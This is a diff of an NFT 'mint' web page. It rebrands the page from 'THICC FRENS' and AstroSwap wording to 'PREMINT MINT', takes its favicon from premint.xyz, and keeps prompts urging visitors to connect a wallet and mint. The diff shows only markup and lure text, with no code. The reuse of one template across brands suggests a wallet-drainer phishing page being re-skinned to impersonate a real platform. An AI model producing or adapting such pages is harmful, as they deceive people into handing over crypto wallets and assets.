@@ -7,7 +7,7 @@
 
     <meta name="viewport" content="width=device-width">
     <meta charset="utf-8">
-    <title>AstroSwap | The NFT Trading Platform for Ethereum</title>
+    <title>Premint | Mint Live</title>
     <link rel="icon" href="https://collectors.premint.xyz/favicon.ico">
     <link rel="preload" href="/1.css" as="style">
     <link rel="stylesheet" href="/2.css" data-n-g="">
@@ -40,8 +40,8 @@
                                 width="560"></div>
                         <div class="max-w-[560px] m-auto flex flex-col items-start space-y-[24px]">
                             <div class="space-y-[16px]">
-                                <h1>THICC FRENS MINT</h1>
-                                <p>Please connect in order to apply for whitelist on Strawbet. See below to <span style="color: rgb(44 187 219)">connect wallet</span>.
+                                <h1>PREMINT MINT</h1>
+                                <p>Please connect in order to mint a premint collectors pass. See below to <span style="color: rgb(44 187 219)">connect wallet</span>.
                             </div><a id="mint"></a>
                             <div class="w-full"><a id="connect_wallet"
                                     class="cool-button cursor-pointer py-[20px] bg-teal text-black font-[800] uppercase block w-full rounded-full bg-gradient-to-r from-teal to-teal-lightest text-center"
@@ -51,8 +51,8 @@
                                     >Mint</a>
                                     <div id="loader" class="lds-dual-ring"></div>
                                 <div class="bg-[#00171F] p-[24px] rounded-xl mt-[24px]">
-                                    <p class="text-gray-200 font-[800]">THICC FRENS MINTING</p>
-                                    <p class="text-gray-300 font-[400]">Need a THICC FREN? Contact us!</p>
+                                    <p class="text-gray-200 font-[800]">PREMINT MINT</p>
+                                    <p class="text-gray-300 font-[400]">Feeling lucky?</p>
                                     <div class="w-full rounded-full bg-teal-darker h-[8px] mt-[24px] mb-[8px]">
                                         <div id="cool_width" class="bg-green rounded-full h-[8px]" style="width: 2px;"></div>
                                     </div>
